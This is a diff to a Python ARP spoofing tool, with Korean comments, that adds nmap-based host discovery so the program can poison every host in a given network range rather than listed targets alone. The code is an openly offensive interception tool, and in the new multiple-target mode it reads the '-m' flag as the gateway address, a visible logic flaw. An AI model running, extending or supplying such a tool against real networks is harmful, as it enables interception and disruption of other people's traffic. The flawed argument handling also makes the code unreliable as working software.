@@ -8,7 +8,7 @@ from scapy.all import * #enables the user to send, sniff, dissect and forge netw
 from scapy.layers.l2 import Ether, ARP #Classes and functions for layer 2 protocols.
 from time import sleep
 import sys
-from typing import Any
+import nmap
 
 # ARP Packet Operation Code
 ARP_REQUEST = 1
@@ -53,6 +53,15 @@ def restoreARP(target_ip:str, target_mac:str, gateway_ip:str, gateway_mac:str) -
     send(target_restore_arp, count=3)
 
 
+def discover_network_hosts(network):
+    nm = nmap.PortScanner()
+    nm.scan(hosts=network, arguments='-sn')
+
+    # 스캔 결과에서 호스트 정보 추출
+    hosts_list = [nm[x]['address'] for x in nm.all_hosts()]
+
+    return hosts_list
+
 # main
 def main(*args, **kwargs) -> int:
     argc = kwargs.get("argc", 0) - 1
@@ -62,22 +71,28 @@ def main(*args, **kwargs) -> int:
     if argc >= 2 and not ("--multiple" in argv or "-m" in argv):
         target_ip = argv[2] # 희생자 IP
         
-    elif argc == 2 and (argv[1] == "--multiple" or argv[1] == "-m"):
-        target_ip = "255.255.255.255" # Broadcast IP
+        target_ips = [] # 희생자 IP 리스트
+        for ip in argv[3:]:
+            target_ips.append(ip)
+        
+    elif argc == 3 and (argv[1] == "--multiple" or argv[1] == "-m"):
+        network_cidr = argv[3]
+        target_ips = discover_network_hosts(network_cidr)
+        if len(target_ips) == 0:
+            print(f"Network CIDR [{network_cidr}]에 호스트가 없습니다.")
+            return -1
     
     else:
         print(f"ARP Spoofing Program {VERSION}\n")
         print(f"usage: {argv[0]} [options] [<args>]\n")
         print("Options:")
         print("   <new gateway ip> <target ip 1> [<target ip 2> ..]   ARP Spoofing")
-        print("   -m --multiple <new gateway ip>                      ARP Spoofing for all network targets")
+        print("   -m --multiple <new gateway ip> <network CIDR>       ARP Spoofing for all network targets")
         print("   -h --help                                           Show this help message and exit")
         return 0
     
-    gateway_ip = argv[1] # 게이트웨이 IP
-    target_ips = [] # 희생자 IP 리스트
-    for ip in argv[3:]:
-        target_ips.append(ip)
+    # 게이트웨이 IP
+    gateway_ip = argv[1] 
 
     # IP 주소로 MAC 주소를 알아낸다
     gateway_mac = getMAC(gateway_ip)
